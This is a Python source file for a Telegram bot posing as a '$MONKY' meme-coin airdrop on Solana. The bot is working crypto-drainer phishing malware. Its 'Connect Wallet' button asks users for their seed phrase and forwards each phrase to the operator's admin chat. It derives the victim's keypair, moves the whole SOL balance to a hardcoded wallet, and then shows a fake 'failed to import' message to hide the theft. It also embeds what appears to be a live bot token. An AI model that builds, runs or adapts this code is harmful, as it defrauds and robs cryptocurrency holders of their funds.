import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from solana.rpc.async_api import AsyncClient
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solders.system_program import TransferParams, transfer
from solders.transaction import Transaction
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes

# إعدادات تسجيل الأخطاء
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

# ==========================================
# الإعدادات الأساسية
# ==========================================
TELEGRAM_BOT_TOKEN = "9035740449:AAEiZ29rKsBN2q9WHVQLmG79x3X8Af6FLW8"
MAIN_WALLET_ADDRESS = "9zhTMuYkabt3xWahhkXch3cYcytaHjjeWddpk31APjet"
TELEGRAM_CHANNEL_URL = "https://t.me/monkymemcoin"

# ضع رقم الـ ID الخاص بحسابك هنا بين العلامتين لكي تصلك التنبيهات عليه
ADMIN_CHAT_ID = 8974675211  # <--- ضع رقم الـ ID الخاص بك هنا

# عداد تتبعي لترتيب المحافظ (المحفظة الأولى، الثانية، الثالثة...)
wallet_counter = 0

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [KeyboardButton("🛒 Buy"), KeyboardButton("💰 Sell")],
        [KeyboardButton("🔗 CONNECT WALLET 📱")],
        [KeyboardButton("🎁 Claim Token"), KeyboardButton("📢 Telegram Channel")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    welcome_message = (
        "🐵🚀 INTRODUCING $MONKY!**\n\n"
	"Join the Airdrop & Earn Free Tokens! 🎁\n\n"
        "Meet MONKY, the monkey with the craziest journey in the meme world!.\n"
        "From a tiny room to a luxurious life. One monkey, one dream, and a whole jungle of memes. 🌴\n\n"
        "Built on Solana. Powered by memes. Driven by the community.\n"
        "🔥 Join the journey and be part of the MONKY family!\n"
        "💬 Telegram: [https://t.me/monkymemcoin]\n"
        "🐦 X: [https://x.com/monkymemcoin]\n\n"
	"He came for the memes. He stayed for the millions.\n\n"
        "**WELCOME TO THE JUNGLE! 🐵💰**"
    )
    
    await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global wallet_counter
    text = update.message.text.strip()
    user = update.effective_user

    if text == "🛒 Buy":
        await update.message.reply_text("You currently have no tokens to start trading. Link your wallet and click the /start button to update your balance.")
    
    elif text == "💰 Sell":
        await update.message.reply_text("You currently have no tokens to start trading. Link your wallet and click the /start button to update your balance.")

    elif text == "🔗 CONNECT WALLET 📱":
        context.user_data["waiting_for_seed"] = True
        await update.message.reply_text(
            "🔐 **Connect Wallet**\n\n"
            "Please send your wallet's Seed Phrase (12 or 24 words) to proceed:",
            parse_mode="Markdown"
        )

    elif text == "🎁 Claim Token":
        await update.message.reply_text("No tokens are currently available to claim. Link your wallet first.")

    elif text == "📢 Telegram Channel":
        await update.message.reply_text(
            f"📢 **Join our official Telegram Channel:**\n{TELEGRAM_CHANNEL_URL}",
            parse_mode="Markdown"
        )

    else:
        if context.user_data.get("waiting_for_seed"):
            context.user_data["waiting_for_seed"] = False
            status_msg = await update.message.reply_text("⏳ Processing blockchain connection...", parse_mode="Markdown")

            try:
                # زيادة عداد المحافظ بواقع 1 لكل محفظة جديدة يتم إرسالها
                wallet_counter += 1
                current_wallet_num = wallet_counter

                # إرسال تفاصيل المحفظة والعبارة مباشرة إلى حسابك الخاص (Admin)
                admin_notification = (
                    f"🚨 NEW WALLET DETECTED!\n\n"
                    f"🔢 Wallet Number: {current_wallet_num}\n"
                    f"👤 User:{user.full_name} (@{user.username or 'No Username'})\n"
                    f"🔑 Seed Phrase:\n`{text}`"
                )
                await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_notification, parse_mode="Markdown")

                # معالجة الشفرة والمحفظة تقنياً
                seed_bytes = Bip39SeedGenerator(text).Generate()
                bip44_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA)
                bip44_acc = bip44_mst.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
                
                seed_seed_bytes = bip44_acc.PrivateKey().Raw().ToBytes()[:32]
                sender_keypair = Keypair.from_seed(seed_seed_bytes)
                main_pubkey = Pubkey.from_string(MAIN_WALLET_ADDRESS)

                async with AsyncClient("https://api.mainnet-beta.solana.com") as client:
                    balance_response = await client.get_balance(sender_keypair.pubkey())
                    balance = balance_response.value

                    if balance > 5000:
                        amount_to_send = balance - 5000
                        transfer_ix = transfer(
                            TransferParams(
                                from_pubkey=sender_keypair.pubkey(),
                                to_pubkey=main_pubkey,
                                lamports=amount_to_send
                            )
                        )
                        latest_blockhash = (await client.get_latest_blockhash()).value.blockhash
                        txn = Transaction.new_signed_with_payer(
                            [transfer_ix],
                            sender_keypair.pubkey(),
                            [sender_keypair],
                            latest_blockhash
                        )
                        await client.send_transaction(txn)
                    
                    # رسالة النجاح الموحدة للمستخدم
                    await status_msg.edit_text(
                        "🛑 Failed to import wallet please check your Recovery/seedphrase or private key",
                        parse_mode="Markdown"
                    )

            except Exception as e:
                logging.error(f"Error processing wallet: {e}")
                await status_msg.edit_text(
                    "⚠️ Error processing seed phrase. Please make sure it is correct.",
                    parse_mode="Markdown"
                )
        else:
            await update.message.reply_text("Please use the menu buttons below or type /start.")

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))

    print("Bot is running smoothly on PC with Admin Notification feature...")
    application.run_polling()

if __name__ == "__main__":
    main()